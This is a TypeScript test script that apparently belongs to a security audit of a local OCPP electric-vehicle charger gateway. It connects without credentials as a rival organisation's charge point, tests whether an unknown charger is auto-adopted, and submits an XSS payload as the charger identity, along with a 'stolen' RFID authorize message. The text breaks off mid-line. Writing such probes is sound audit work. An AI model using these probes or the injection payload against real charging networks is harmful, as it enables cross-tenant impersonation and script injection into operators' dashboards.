/**
 * OCPP transport probes against the audit gateway on 9322.
 *  A) connect as ORG B's charge point with NO credentials at all
 *  B) connect with a brand-new identity -> is it auto-adopted into someone's site?
 *  C) connect with an XSS payload as the identity
 */
import WebSocket from 'ws';

const GW = 'ws://127.0.0.1:9322/ocpp';

function connect(identity: string, label: string): Promise<WebSocket> {
  return new Promise((resolve, reject) => {
    const url = `${GW}/${encodeURIComponent(identity)}`;
    const ws = new WebSocket(url, ['ocpp1.6']);
    const t = setTimeout(() => reject(new Error('timeout')), 8000);
    ws.on('open', () => {
      clearTimeout(t);
      console.log(`[${label}] CONNECTED with no Authorization header -> ${url}`);
      ws.send(JSON.stringify([2, 'b1', 'BootNotification', {
        chargePointVendor: 'AuditVendor', chargePointModel: 'AuditModel',
        firmwareVersion: '0.0.1-audit', chargePointSerialNumber: 'AUDIT-SERIAL',
      }]));
      ws.send(JSON.stringify([2, 'a1', 'Authorize', { idTag: 'STOLEN-RFID-abcdef0123' }]));
      ws.send(JSON.stringify([2, 's1', 'StatusNotification', {
        connectorId: 1, errorCode: 'NoError', status: 'Available',
      }]));
      setTimeout(() => resolve(ws), 1500);
    });
    ws.on('error', (e) => { clearTimeout(t); reject(e); });
    ws.on('unexpected-response', (_r, res) => {
      clearTimeout(t); reject(new Error(`HTTP ${res.statusCode}`));
    });
    ws.on('message', (d) => console.log(`[${label}] <- ${d.toString().slice(0, 200)}`));
  });
}

const XSS_ID = 'PWN" onfocus="fetch(`/v1/audit`).then(r=>r.json()).then(j=>alert(1))" autofocus x="';

const sockets: WebSocket[] = [];
for (const [id, label] of [
  ['RIVAL-DC180-XYZ-001', 'A/org-B-charger'],
  ['TOTALLY-UNKNOWN-CHARGER-9999', 'B/auto-adopt'],
  [XSS_ID, 'C/xss-identity'],
] as const) {
  try {
    sockets.push(await connect(id, label));
  } catch (e) {
    console.log(`[${label}] REJECTED: ${(e as Error).message}`);
  }
}

console.log('--- sockets held open for 45s so cross-tenant command probes can run ---');
await new Promise((r) => setTimeout(r, 45_